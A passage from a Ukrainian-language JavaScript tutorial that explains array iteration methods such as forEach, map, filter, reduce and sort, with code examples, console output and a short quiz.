6]]\n\nintervals.forEach(function (interval) { console.log(this) }, intervals)\n~~~\n\n^^В результаті виконання цього коду в консолі буде масив **~intervals~**.^^\n^^Фактично передача методу другого аргументу дорівнює біндингу контексту:^^\n\n~~~js\nintervals.forEach(function (interval) { console.log(this) }.bind(intervals))\n~~~\n\n^^Тому при використанні стрілочної функції, контекст якої змінити неможливо, в консолі побачимо об'єкт **~window~**^^\n\n~~~js\nconst intervals = [[1, 8], [2, 3], [4, 7], [5, 6]]\n\nintervals.forEach(interval => console.log(this), intervals)\n~~~\n\n_____________________\n\n^^Припустимо, ми хочемо передавати посилання на масив **~res~**, куди слід розміщувати результати обчислень:^^\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst  numbers = [8, 4, 9, 7]\nconst res = []\n\nnumbers.forEach(function (numb, ind) {\n  this.push(numb * ind)\n}, res)\n~~~\n\n^^Такі операції позбавлені особливого сенсу, оскільки для цього ми маємо метод <a href=\"#map()\">![ico-20 link]**map**</a>, який буде розглянуто далі.^^\n\n_________________________________\n\n### ![ico-20 icon] Приклади з методом forEach\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nconst tags = ['figure', 'div', 'h3', 'img']\nconst attrs = [\n  {\n    id: 'figure-blue',\n    style: 'padding: 48px; background: #09b;'\n  },\n  {\n    id: 'figure-yellow',\n    style: 'padding: 16px; background: #fa0;'\n  },\n  {\n    style: 'color: #fff; font-family: Arial; font-weight: bold',\n    innerText: 'Welcome, students!'\n  },\n  {\n    src: 'https://pictogrammers.com/images/libraries/mdi.svg',\n    width: 64\n  }\n]\n\nconst parents = [null, 'figure-blue', 'figure-yellow', 'figure-yellow']\n\ntags.forEach((tag, index) => {\n  const elem = (parents[index] ? document.getElementById(parents[index]) : document.body)\n    .appendChild(document.createElement(tag))\n  Object.assign(elem, attrs[index])\n})\n~~~\n\n{{{Array-iteration-methods-1.js}}}\n\n_____________________\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['zero', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine']\n  .forEach((item, index) => Object.assign(window, {\n      [item]: arg => typeof arg === 'function' ? arg(index) : index\n  }))\n~~~\n\nУ цьому прикладі ми створюємо за допомогою методу **~forEach~** масив функцій з іменами:\n\"zero\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\", \"nine\".\n\nКожна з цих функцій перевіряє тип переданого їй аргументу **_arg_**,\nі якщо це ~function~, то викликає **_arg_**,\nпередаючи їй як аргумент свій порядковий номер (0, 1, 2 ...),\nінакше повертає число - свій порядковий номер (0, 1, 2 ...).\n\n{{{Array-iteration-methods-2.js}}}\n______________________________________________\n\n◘◘![ico-25 cap] **10**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .forEach((item, index) => Object.assign(window, {\n    operations: ['+', '-', '/', '*'],\n    [item]: function () {\n      return arguments.length === 2\n        ? eval(`arguments[0] ${this.operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\nУ цьому прикладі ми створюємо ще один масив функцій з іменами \"plus\", \"minus\", \"divide\", \"multiply\".\nКожна з цих функцій має два формальні параметри,\nтому насамперед вона перевіряє довжину об'єкта **arguments**,\nі якщо довжина дорівнює 2, то виконує відповідну операцію з аргументами\n(складає, віднімає, множить, ділить).\nУ протилежному випадку повертає карровану функцію,\nу якої перший аргумент уже \"прошитий\",\nі яку можна викликати з одним (відсутнім другим) аргументом.\n\n{{{Array-iteration-methods-3.js}}}\n\n____________________\n\n![ico-25 memo] Вправа\n\n^^Розберіться самостійно, що робить наступний код:^^\n\n~~~js\nconst callback = rule => console.log(rule)\n\nArray.from(document.styleSheets)\n  .forEach(sheet => sheet.href && Array.from(sheet.cssRules).forEach(callback))\n~~~\n\n______________________\n\n## ![ico-30 icon] map()\n\nЦей метод повертає новий масив.\nЕлементами нового масиву будуть значення, які повертає **функція-аргумент** на кожній ітерації.\n**Функція-аргумент** методу повинна повертати нове значення (має бути оператор ~return~).\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map(user => `${user.name}: ${new Date().getFullYear() - user.birthYear}`)\n~~~\n\n~~~console\n► (5) ['Mary: 26', 'Piter: 23', 'Robert: 20', 'Helen: 25', 'Stephan: 22']\n~~~\n_______________________________\n\nТак само, як і в методі **~forEach()~**, у методі **~map()~**, **функція-аргумент** має три опціональні формальні параметри.\n![ico-20 green-ok] Аргумент **arr** міститиме посилання на вихідний масив.\n![ico-20 green-ok] Аргумент **index** - це лічильник ітерацій, або індекс поточного елемента масиву, що ітерується.\n\n~~~js\nconst users = [\n  { name: 'Mary', birthYear: 1998 },\n  { name: 'Piter', birthYear: 2001 },\n  { name: 'Robert', birthYear: 2004 },\n  { name: 'Helen', birthYear: 1999 },\n  { name: 'Stephan', birthYear: 2002 },\n]\n\nusers.map((user, index, arr) => {\n  const olders = arr\n    .map(human => human.birthYear > user.birthYear ? human.name : null)\n    .join(' ')\n  return `${user.name} is younger then ${olders}`\n})\n~~~\n\n~~~console\n▼ (5) [...]\n  0: \"Mary is younger then  Piter Robert Helen Stephan\"\n  1: \"Piter is younger then   Robert  Stephan\"\n  2: \"Robert is younger then     \"\n  3: \"Helen is younger then  Piter Robert  Stephan\"\n  4: \"Stephan is younger then   Robert  \"\n  length: 5\n  ► [[Prototype]]: Array(0)\n~~~\n\n______________________________________________\n\n### ![ico-20 icon] Приклади з методом map\n\nПерейдіть за [![ico-20 link] **_посиланням_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nУ консолі нової вкладки виконайте код:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nlocation.search\n  .slice(1).split(',')\n  .map(x => ({ [x.split('=')[0]] : x.split('=')[1] }))\n~~~\n\nУ вас має вийти результат:\n\n~~~console\n▼ (2) [{…}, {…}]\n  ► 0: {name: \"garevna\"}\n  ► 1: {date: \"10.07.2018\"}\n    length: 2\n  ► __proto__: Array(0)\n~~~\n\n______________________________________________\n\nПерейдіть за [![ico-20 link] **_посиланням_**](https://developer.mozilla.org/en-US/docs/Web/API/Window/location?name=garevna,date=10.07.2018 )\n\nТепер у консолі нової вкладки оголосіть функцію:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nfunction getSearchObject () {\n  var obj = {}\n  location.search.slice(1).split(',')\n    .map(x => x.split('='))\n    .map (function (item) { this[item[0]] = item[1] }, obj)\n  return obj\n}\n~~~\n\nВикличте функцію **~getSearchObject~**.\n\nУ вас має вийти результат:\n\n~~~console\n▼ {name: \"garevna\", date: \"10.07.2018\"}\n    date: \"10.07.2018\"\n    name: \"garevna\"\n  ► __proto__: Object\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\n;['plus', 'minus', 'divide', 'multiply']\n  .map((item, index) => Object.assign(window, {\n    [item] () {\n      const operations = ['+', '-', '/', '*']\n      return arguments.length === 2\n        ? eval(`arguments[0] ${operations[index]} arguments[1]`)\n        : window[item].bind(null, arguments[0])\n    }\n  }))\n~~~\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst funcs = [\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 1\n    for (const arg of arguments) res *= parseFloat(arg) || 0\n    return res\n  },\n  function () {\n    let res = 0\n    for (const arg of arguments) res += parseInt(arg) || 0\n    return res\n  }\n]\n\nFunction.prototype.currying = function (arg, context) {\n  return this.bind(context, arg)\n}\n\nfuncs\n  .map(func => func.currying(2.5))\n  .map(func => func.currying(2))\n  .map(func => func.currying(4.5))\n  .map(func => func())\n~~~\n\n~~~console\n▼ (3) [9, 22.5, 8]\n    0: 9\n    1: 22.5\n    2: 8\n    length: 3\n  ► [[Prototype]]: Array(0)\n~~~\n__________________________\n\n## ![ico-25 icon] filter()\n\nМетод **~filter()~** ітерує масив, перевіряючи виконання заданої умови для кожного елемента масиву.\nМетод повертає новий масив.\nУ результуючий масив потраплять лише елементи, які задовольняють умові фільтрації.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { name: 'Микола Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Shveik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Пилип Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nvar usa = sourceArray.filter(x => x.country === 'USA')\n\nconsole.log(usa)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [{…}, {…}, {…}]\n  ► 0: {name: \"Duke Shane\", country: \"USA\"}\n  ► 1: {name: \"Margaret Johnson\", country: \"USA\"}\n  ► 2: {name: \"Robert Trump\", country: \"USA\"}\n    length: 3\n  ► __proto__: Array(0)\n~~~\n\n______________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .filter(mode => transactions[mode].includes(transaction))\n    return res[0] || new TypeError('Invalid transaction')\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________________\n\n## ![ico-25 icon] find()\n\nМетод шукає в масиві та повертає перший знайдений елемент, що задовольняє задану умову.\n\nЯкщо такого елемента у масиві немає, повертає ~undefined~.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nvar cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.find(card => card.cash > 4000)\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ { num: \"457811714\", cash: 5000 }\n    cash: 5000\n    num: \"457811714\"\n  ► __proto__: Object\n~~~\n\n___________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst getTransactionMode = (() => {\n  const transactions = {\n    readwrite: ['add', 'put', 'delete', 'clear'],\n    readonly: ['get', 'getAll', 'getKey', 'getAllKeys']\n  }\n  return function (transaction) {\n    const res = ['readwrite', 'readonly']\n      .find(mode => transactions[mode].includes(transaction))\n    return res || 'unacceptable'\n  }\n})()\n\ngetTransactionMode('add')          // 'readwrite'\ngetTransactionMode('getAllKeys')  // 'readonly'\n~~~\n\n_________________________\n\n## ![ico-25 icon] findIndex()\n\nПодібно до методу ~find()~, шукає в масиві перший елемент, що задовольняє задану умову.\nПроте повертає не сам елемент, яке індекс.\n\nЯкщо такого елемента у масиві не виявлено, повертає **-1**.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst cards = [\n  { num: '457892425', cash: 1100 },\n  { num: '457812840', cash: 3000 },\n  { num: '457855780', cash: 1200 },\n  { num: '457811714', cash: 5000 }\n]\n\ncards.findIndex(card => card.cash > 1500)  // 1\n~~~\n\nОчевидна перевага перед методом **~indexOf~** полягає в тому, що можна працювати з масивами елементів, що мають **посилальний тип даних**.\nУ цьому прикладі елементами масиву є об'єкти, і метод **~indexOf~** до цього масиву незастосовний.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst functions = [\n  message => message + '$$$',\n  () => Math.random() > 0.5 ? 'success' : 'failure',\n  arg => typeof arg === 'function' ? arg() : arg\n]\n\nconst sample = () => Math.random() > 0.5 ? 'success' : 'failure'\n\nfunctions.findIndex(func => func.toString() === sample.toString())\n~~~\n\n_______________________\n\n## ![ico-25 icon] every()\n\nЗдійснює перевірку масиву на предмет входження елементів, які **не задовольняють** заданій умові.\n\nПовертає логічне значення:\n  • **~true~**, якщо всі елементи масиву пройшли перевірку.\n  • **~false~**, якщо хоча б один елемент не пройшов перевірку.\n\n**Функція-аргумент** перевіряє виконання заданої умови для кожного елемента масиву, і повертає логічне значення.\n\nМасив ітерується доти, доки функція не поверне значення **~false~**.\nУ цьому випадку метод поверне **~false~**.\n\nЯкщо **функція-аргумент** поверне **~true~** для всіх елементів масиву, метод поверне **~true~**.\n\n◘◘![ico-25 cap] **every**◘◘\n\n~~~js\nconst people = [\n  { name: 'Микола Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Пилип Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.every(x => x.country === 'Ukraine')\n\nconsole.log(res)\n~~~\n\n^^У цьому прикладі масив **people** перевіряється на наявність у ньому мешканців **не** України.^^\n^^Змінна **res** матиме значення ~false~, оскільки в масиві є елементи, що не задовольняють задану умову.^^\n\n______________________________________________\n\n## ![ico-25 icon] some()\n\nЗдійснює перевірку масиву щодо входження елементів, що задовольняють заданій умові.\n\nПовертає логічне значення (знайдено/не знайдено).\n\n**Функція-аргумент** перевіряє виконання заданої умови для кожного елемента масиву та повертає логічне значення.\n\nМасив ітерується доти, доки функція не поверне значення **~true~**.\nУ цьому випадку метод поверне **~true~**.\n\nЯкщо функція поверне **~false~** для всіх елементів масиву, метод поверне **~false~**.\n\n◘◘![ico-25 cap] **some**◘◘\n\n~~~js\nconst people = [\n  { name: 'Микола Василенко', country: 'Ukraine' },\n  { name: 'Duke Shane', country: 'USA' },\n  { name: 'Demid Schweik', country: 'France' },\n  { name: 'Семен Картко', country: 'Ukraine' },\n  { name: 'Margaret Johnson', country: 'USA' },\n  { name: 'Пилип Данько', country: 'Ukraine' },\n  { name: 'Robert Trump', country: 'USA' },\n]\n\nconst res = people.some(x => x.country === 'Pakistan')\n\nconsole.log(res)\n~~~\n\n^^У цьому прикладі масив **people** перевіряється на наявність у ньому жителів Пакистану.^^\n^^Змінна **res** матиме значення ~false~, оскільки таких \"персонажів\" у масиві немає.^^\n\n^^Метод **~some~** можна замінити наступним кодом:^^\n\n~~~js\nconst res = people\n  .map(human => human.country)\n  .includes('Pakistan')\n~~~\nабо таким:\n~~~js\npeople\n  .filter(x => x.country === 'Pakistan')\n  .length > 0\n~~~\n\n____________________________\n\n## ![ico-25 icon] reduce()\n\nЦей метод відрізняється від своїх колег списком формальних параметрів **функції-аргументу**.\nСаме першим формальним параметром **функції-аргументу** тепер буде не поточний елемент масиву, а **змінна-акумулятор**.\nЗначення цієї змінної буде результатом роботи методу.\n\nГнучкість і універсальність цього методу полягає в тому, що результатом його роботи може бути що завгодно: число, масив, об'єкт, рядок, логічне значення і т.д.\nЦей результат \"накопичується\" у **змінній-акумуляторі**.\n\nЯк і всі ітеруючі методи масивів, які ми вже обговорювали, метод **~reduce~** отримує **функцію** як перший необхідний аргумент.\nОднак другий аргумент методу не є посиланням на контекст, в якому викликається **функція-аргумент**.\nВін має зовсім інше призначення: задає початкове значення **змінної-аккумулятора**.\n\n![ico-20 warn] **Якщо початкове значення змінної-аккумулятора не встановлено, то в якості початкового значення змінної-аккумулятора буде використовуватися значення першого елемента масиву.**.\n\n^^Тобто, якщо ми не передамо другий аргумент методу, він встановить початкове значення **змінної-акумулятора** на значення першого елемента ітерованого масиву.^^\n\n\n![ico-25 cap] Розглянемо найпростіший приклад:\n\n~~~js\n[1, 2, 3, 4, 5].reduce(accumulator => accumulator * 2) // 16\n~~~\n\nТак як початкове значення змінної-акумулятора не встановлено, то воно буде дорівнювати значенню першого елемента масиву, тобто ** 1**.\nЦикл буде \"крутитися\" до останнього елементу масиву, але самі елементи не використовуються **функцією-аргументом**:\n\n~~~js\naccumulator => accumulator * 2\n~~~\n\nТому на кожній ітерації значення **змінної-акумулятора** буде просто подвоюватися:\n\n•• 1 * 2 * 2 * 2 * 2 = 16 ••\n\n_____________________________________\n\n![ico-25 cap] Тепер запросимо на цю тусовку другий формальний параметр **функції-аргумента**:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item) // 120\n~~~\n\nПочаткове значення **змінної-акумулятора** буде дорівнювати 1 ^^(значення першого елемента масиву)^^, але на кожній ітерації **змінна-акумулятор** буде множитися на значення поточного елемента масиву:\n\n•• 1 * 2 * 3 * 4 * 5 = 120 ••\n\n____________________________\n\n![ico-25 cap] Настав час ввести в бій початкове значення **змінної-акумулятора**:\n\n~~~js\n[1, 2, 3, 4, 5].reduce((accumulator, item) => accumulator * item, 5) // 600\n~~~\n\n•• 5 * 1 * 2 * 3 * 4 * 5 = 600 ••\n\nОсь така чудова машина зараз є в нашому розпорядженні.\n\n_________________________________\n\n![ico-25 cap] Копнем глибше. Задіємо третій формальний параметр **функції-аргументу**:\n\n~~~js\n[10, 2, 3, 4, 5].reduce((accumulator, item, index) => accumulator * item + index) // 1319\n~~~\n\nТут метод **~reduce~** виконує таку послідовність обчислень:\n\n•• ((((10 + 0) * 2 + 1) * 3 + 2) * 4 + 3) * 5 + 4 = 1319 ••\n\n_________________________________________\n\nДо цього часу ми розглядали масив чисел і числове значення **змінної-акумулятора**.\n\nОднак потенціал цього методу набагато більший, і його можливості набагато ширші.\n\n### ![ico-20 icon] Приклади з методом reduce()\n\nДавайте зведемо масив рядків до об'єкта.\nДля цього нам обов'язково потрібно вказати стартове значення акумулятора, оскільки значення першого елемента масиву буде рядок, а ми хочемо отримати об'єкт.\n\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\n['plus', 'minus', 'divide', 'multiply']\n  .reduce((res, item) => Object.assign(res, { [item]: item.length }), {})\n~~~\n\n~~~console\n▼ {plus: 4, minus: 5, divide: 6, multiply: 8}\n  divide: 6\n  minus: 5\n  multiply: 8\n  plus: 4\n  ► [[Prototype]]: Object\n~~~\n\n___________________\n\nТепер зведемо масив об'єктів до рядка.\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst string = [\n  { name: 'Piter', age: 31 },\n  { name: 'Helen', age: 29 },\n  { name: 'Robert', age: 45 },\n  { name: 'Andrew', age: 24 }\n].reduce((res, user) => res += `${user.name}: ${user.age}\\n`, 'Users:\\n')\n\nconsole.log(string)\n~~~\n\n~~~console\nUsers:\nPiter: 31\nHelen: 29\nRobert: 45\nAndrew: 24\n~~~\n\n_____________________________________\n\nТепер порахуємо, скільки разів кожен символ зустрічається в рядку, і повернемо об'єкт:\n\n◘◘![ico-20 cap] ** 3**◘◘\n~~~js\nconst string = 'With the trust of thousands of partners from around the world, we are dedicated to contributing to the widespread adoption of cryptocurrencies.'\n\nstring\n  .split('')\n  .reduce((result, char) => Object.assign(result, {\n    [char]: (result[char] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-2.js}}}\n_____________________________________\n\nТепер порахуємо, скільки жителів кожної країни у списку.\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst people = [\n  { name: 'Alexandra Pugh', country: 'Ukraine' },\n  { name: 'Andrea McKay', country: 'USA' },\n  { name: 'Anthony Webster', country: 'United Kingdom' },\n  { name: 'Noemi Lynch', country: 'Ukraine' },\n  { name: 'Enrique Michael', country: 'France' },\n  { name: 'Collin Roy', country: 'USA' },\n  { name: 'Stella Dillon', country: 'United Kingdom' },\n  { name: 'Lyra Bryant', country: 'France' },\n  { name: 'Shane Dodson', country: 'Ukraine' },\n  { name: 'Dream Douglas', country: 'USA' },\n  { name: 'Bobby Richards', country: 'USA' },\n  { name: 'Carmelo Atkinson', country: 'United Kingdom' }\n]\n\nconst result = people\n  .reduce((result, human) => Object.assign(result, {\n    [human.country]: (result[human.country] || 0) + 1\n  }), {})\n~~~\n\n{{{Array-iteration-methods-reduce-1.js}}}\n\n__________________________________________\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res += parseInt(number / Math.pow(10, index)), 0)\n~~~\n\nДвигун використовує експоненційну форму уявлення малих чисел, тобто. замість **~0.0000005~** буде **~5e-7~**.\nДля великих чисел відбувається те саме, тобто. замість **~5000000000000000000000~** буде **~5e+21~**.\n\nЗвідси:\n\n~~~js\nparseInt(5e-7) // 5\n\nparseInt(5e+21) // 5\n\nparseInt(0.0000005) // 5\n\nparseInt(5000000000000000000000) // 5\n~~~\n\n{{{Array-iteration-methods-reduce-3.js}}}\n\n_________________________________________\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\n[5, 4, 3, 1, 10, 5, 9, 2, 1, 4]\n  .reduce((res, number, index, arr) => res.concat(number / Math.pow(10, index)), [])\n~~~\n\n{{{Array-iteration-methods-reduce-4.js}}}\n\n_____________________________________\n\nФункція, що передається методу **~reduce~** як перший обов'язковий аргумент,\nяк і у випадку інших ітеруючих методів методів, може приймати додаткові аргументи - індекс поточного елемента масиву і посилання на сам вихідний масив.\n\n@@@@\nЗавдяки посиланню ми можемо маніпулювати вихідним масивом, що робить його мутабельним.\n![](images/reference-lockpick-ukr.png)\n@@@@\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~js\nconst array = ['first', 'second', 'third', 'fourth']\n\narray.reduce((res, item, index, arr) => {\n  const order = Math.round(Math.random() * (arr.length - 1))\n  res.push(arr.splice(order, 1)[0])\n  return res\n}, array)\n~~~\n\n{{{Array-iteration-methods-reduce-5.js}}}\n\n_____________________________________\n\n### Math.sqrt\n\nПростежимо, як працюватиме метод **~reduce~**, якщо передати йому першим аргументом **~Math.sqrt~**.\nБібліотечна функція **~Math.sqrt~** приймає всього 1 аргумент (число) і повертає квадратний корінь з отриманого аргументу.\nЯкщо під час виклику ми не передаємо методу **~reduce~** другий аргумент, він використовуватиме як стартове значення акумулятора значення першого елемента масиву.\nНа кожній ітерації це значення замінюватиметься його квадратним коренем.\nІнші елементи масиву в обчисленнях не братимуть участі, оскільки **~Math.sqrt~** приймає всього 1 аргумент, і це буде поточне значення змінної-акумулятора.\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\n;[625, 5, 10].reduce(Math.sqrt) // 5\n~~~\n\nУ цьому прикладі з числа 625 двічі було витягнуто квадратний корінь:\n••625 -> 25 -> 5••\n\nЧому двічі? Тому що всього елементів у масиві 3, але перший елемент став стартовим значенням змінної-акумулятора.\n\nЯкщо ми додамо ось такий метод **~root~** у прототип конструктора **~Array~**, то результат його виклику буде тим самим:\n\n~~~js\nArray.prototype.root = function () {\n  return Math.pow(this[0], Math.pow(0.5, this.length - 1))\n}\n\n;[625, 0, 0].root() // 5\n~~~\n____________________________________________\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\n[0, 0, 0].reduce(Math.sqrt, 625 * 625) // 5\n~~~\n\nУ цьому прикладі ми задаємо стартове значення **змінної-акумулятора** (625 * 625) другим аргументом методу **~reduce~**.\nТому число ітерацій (тобто. скільки разів буде вилучено корінь квадратний з **змінної-акумулятора**) дорівнюватиме кількості елементів масиву.\n\n{{{Array-iteration-methods-reduce-7.js}}}\n\n_______________________________\n\n### Math.pow\n\nТепер передаватимемо методу **~reduce~** першим аргументом бібліотечну функцію **Math.pow** (зведення до ступеня).\nЦя функція приймає два числові аргументи: число, яке потрібно звести в ступінь, і значення ступеня.\n\nЯкщо ми не передаємо стартове значення **змінної-акумулятора** другим аргументом методу **~reduce~**, то в цій якості буде використано значення першого елемента масиву.\nІнші елементи масиву будуть значеннями ступеня, в який потрібно звести поточне значення **змінної-акумулятора**.\n\nЯкщо ми передаємо стартове значення **змінної-акумулятора**, то всі елементи масиву будуть розглядатися як ступінь, в яку потрібно звести поточне значення **змінної-акумулятора**.\n\n◘◘![ico-20 cap] ** 10**◘◘\n\n~~~js\nconsole.log([3, 2, 2].reduce(Math.pow))    // 81\n\nconsole.log(Math.pow(Math.pow(3, 2), 2))   // 81\n\nconsole.log([2, 3, 3].reduce(Math.pow))    // 512\n\nconsole.log(Math.pow(Math.pow(2, 3), 3))   // 512\n\nconsole.log([2, 2, 2].reduce(Math.pow, 2)) // 256\n\nMath.pow(Math.pow(Math.pow(2, 2), 2), 2)   // 256\n~~~\n\n{{{Array-iteration-methods-reduce-10.js}}}\n\nЯкщо ми додамо в прототип конструктора **~Array~** метод **~pow~**, цей метод буде працювати аналогічно методу **~reduce~**, викликаному з бібліотечною функцією **~Math.pow~** і без другого аргументу:\n\n~~~js\nArray.prototype.pow = function () {\n  let res = this[0]\n  for (const item of this.slice(1)) {\n    res = Math.pow(res, item)\n  }\n  return res\n}\n\n[3, 2, 2].pow() // 81\n~~~\n\n______________________________________\n\n### ![ico-25 hw] Тести\n\nЩо повернуть такі вирази:\n\n◘◘** 1**◘◘\n\n→→→ [].reduce(Math.pow) | TypeError, null, NaN, 0 | TypeError →→→\n\n◘◘** 2**◘◘\n\n→→→ [].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | Google →→→\n\n◘◘** 3**◘◘\n\n→→→ [1].reduce(Math.sqrt, 'Google') | TypeError, null, NaN, 0, 'Google' | NaN →→→\n\n◘◘** 4**◘◘\n\n→→→ [-10, -20, 5].reduce(Math.abs) | null, NaN, 0, 10, 20, 5 | 10 →→→\n\n◘◘** 5**◘◘\n\n→→→ [.5].reduce(Math.pow, 49) | null, NaN, 0, 7, 49, 5 | 7 →→→\n\n_________________________________\n\n## ![ico-25 icon] sort()\n\nЧисло ітерацій буде свідомо більше, ніж кількість елементів масиву.\n\nМетод сортує масив згідно з заданою умовою сортування.\nУмову сортування перевіряє **функція-аргумент**, що передається методу.\n_**Функція-аргумент** має два формальні параметри, значення яких використовуються для порівняння._.\n\nФункція повертає одне із трьох значень:\n\n|  0 | елементи збіглися (рівні)         |\n|  1 | перший аргумент більший за другий |\n| -1 | другий аргумент більший за перший |\n\nНа основі значення, що повертається функцією, метод змінює порядок елементів у масиві.\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar sourceArray = [\n  { title: 'fond', value: 100 },\n  { title: 'salary', value: 400 },\n  { title: 'bonus', value: 70 },\n  { title: 'debt', value: 700 },\n  { title: 'credit', value: 200 },\n  { title: 'payments', value: 150 },\n  { title: 'income', value: 320 },\n]\nvar resArray = sourceArray.sort(function (x, y) {\n  return x.value - y.value\n})\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {title: \"bonus\", value: 70}\n  ► 1: {title: \"fond\", value: 100}\n  ► 2: {title: \"payments\", value: 150}\n  ► 3: {title: \"credit\", value: 200}\n  ► 4: {title: \"income\", value: 320}\n  ► 5: {title: \"salary\", value: 400}\n  ► 6: {title: \"debt\", value: 700}\n    length: 7\n  ► __proto__: Array(0)\n~~~\n\n^^Щоб зрозуміти механізм сортування, виведемо значення порівнюваних елементів масиву в консолі на кожній ітерації:^^\n\n◘◘![ico-20 cap] ** 2**◘◘\n~~~js\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    console.log(`${x.title} - ${y.title} = ${x.value - y.value}`)\n    return  x.value - y.value\n  })\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\nfond - bonus = 30\npayments - fond = 50\ncredit - payments = 50\nincome - credit = 120\nsalary - income = 80\ndebt - salary = 300\n~~~\n\n^^^[Логування]\n\n^^Створимо масив **log**, в якому будемо логувати всі операції в процесі сортування масиву.^^\n\n~~~js\nvar log = []\nvar resArray = sourceArray\n  .sort(function (x, y) {\n    log.push({\n      id: x.title + \" > \" + y.title,\n      res: x.value > y.value\n    })\n    return  x.value - y.value\n  })\n~~~\n**log**\n~~~console\n▼ (13) [...]\n  ► 0: {id: 'salary > fond', res: true}\n  ► 1: {id: 'bonus > salary', res: false}\n  ► 2: {id: 'bonus > salary', res: false}\n  ► 3: {id: 'bonus > fond', res: false}\n  ► 4: {id: 'debt > fond', res: true}\n  ► 5: {id: 'debt > salary', res: true}\n  ► 6: {id: 'credit > salary', res: false}\n  ► 7: {id: 'credit > fond', res: true}\n  ► 8: {id: 'payments > credit', res: false}\n  ► 9: {id: 'payments > fond', res: true}\n  ► 10: {id: 'income > credit', res: true}\n  ► 11: {id: 'income > debt', res: false}\n  ► 12: {id: 'income > salary', res: false}\n    length: 13\n  ► __proto__: Array(0)\n~~~\n^^^\n\nОтже, на відміну від інших методів, що ітерують, **функція-аргумент** приймає строго два параметри.\n\n![ico-20 warn] Цьому методу не можна передати посилання на контекст виклику.\n\n![ico-20 require] Самостійно спробуйте намалювати блок-схему алгоритму сортування масиву методом **~sort()~**.\n\n__________________________\n\n## ![ico-25 icon] flatMap()\n\nЄ рядок **cookie**:\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar cookie = 'name=user; token=Jd7-js15/84; interest=javascript'\n~~~\n\nСплітимо рядок **cookie** і застосуємо метод **~map~** до отриманого масиву.\n\n~~~js\nconsole.log(cookie.split('; ').map(item => item.split('='))\n~~~\n\n◘◘**^^Результат^^**◘◘\n\n~~~console\n▼ (3) [Array(2), Array(2), Array(2)]\n  ► 0: (2) [\"name\", \"user\"]\n  ► 1: (2) [\"token\", \"Jd7-js15/84\"]\n  ► 2: (2) [\"interest\", \"javascript\"]\n    length: 3\n  ► 